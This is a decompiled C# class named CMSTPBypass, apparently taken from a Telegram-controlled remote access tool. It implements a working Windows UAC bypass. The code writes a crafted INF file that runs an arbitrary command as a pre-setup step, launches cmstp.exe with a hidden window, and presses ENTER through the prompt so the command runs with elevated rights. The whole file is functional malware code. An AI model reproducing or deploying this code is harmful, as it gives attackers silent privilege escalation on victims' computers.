using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;
using TelegramBot;

// Token: 0x02000002 RID: 2
public class CMSTPBypass
{
	// Token: 0x06000001 RID: 1 RVA: 0x00003484 File Offset: 0x00001684
	public static string SetInfFile(string CommandToExecute)
	{
		string value = Path.GetRandomFileName().Split(new char[]
		{
			Convert.ToChar(".")
		})[0];
		string value2 = "C:\\windows\\temp";
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append(value2);
		stringBuilder.Append("\\");
		stringBuilder.Append(value);
		stringBuilder.Append(".inf");
		StringBuilder stringBuilder2 = new StringBuilder(CMSTPBypass.InfData);
		stringBuilder2.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
		File.WriteAllText(stringBuilder.ToString(), stringBuilder2.ToString());
		return stringBuilder.ToString();
	}

	// Token: 0x06000002 RID: 2 RVA: 0x00003514 File Offset: 0x00001714
	public static bool Execute(string CommandToExecute)
	{
		if (!File.Exists(CMSTPBypass.BinaryPath))
		{
			Console.WriteLine("Could not find cmstp.exe binary!");
			return false;
		}
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append(CMSTPBypass.SetInfFile(CommandToExecute));
		Console.WriteLine("Payload file written to " + stringBuilder.ToString());
		Process.Start(new ProcessStartInfo(CMSTPBypass.BinaryPath)
		{
			Arguments = "/au " + stringBuilder.ToString(),
			UseShellExecute = false,
			CreateNoWindow = true
		});
		IntPtr value = 0;
		value = IntPtr.Zero;
		do
		{
			value = CMSTPBypass.SetWindowActive("cmstp");
		}
		while (value == IntPtr.Zero);
		SendKeys.SendWait("{ENTER}");
		return true;
	}

	// Token: 0x06000003 RID: 3 RVA: 0x000035C8 File Offset: 0x000017C8
	public static IntPtr SetWindowActive(string ProcessName)
	{
		Process[] processesByName = Process.GetProcessesByName(ProcessName);
		if (processesByName.Length == 0)
		{
			return IntPtr.Zero;
		}
		processesByName[0].Refresh();
		IntPtr intPtr = 0;
		intPtr = processesByName[0].MainWindowHandle;
		if (intPtr == IntPtr.Zero)
		{
			return IntPtr.Zero;
		}
		DLLImport.SetForegroundWindow(intPtr);
		DLLImport.ShowWindow(intPtr, 5);
		return intPtr;
	}

	// Token: 0x04000001 RID: 1
	public static string InfData = "[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n[DefaultInstall]\r\nCustomDestination=CustInstDestSectionAllUsers\r\nRunPreSetupCommands=RunPreSetupCommandsSection\r\n\r\n[RunPreSetupCommandsSection]\r\n; Commands Here will be run Before Setup Begins to install\r\nREPLACE_COMMAND_LINE\r\ntaskkill /IM cmstp.exe /F\r\n\r\n[CustInstDestSectionAllUsers]\r\n49000,49001=AllUSer_LDIDSection, 7\r\n\r\n[AllUSer_LDIDSection]\r\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\r\n\r\n[Strings]\r\nServiceName=\"CorpVPN\"\r\nShortSvcName=\"CorpVPN\"\r\n\r\n";

	// Token: 0x04000002 RID: 2
	public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
}
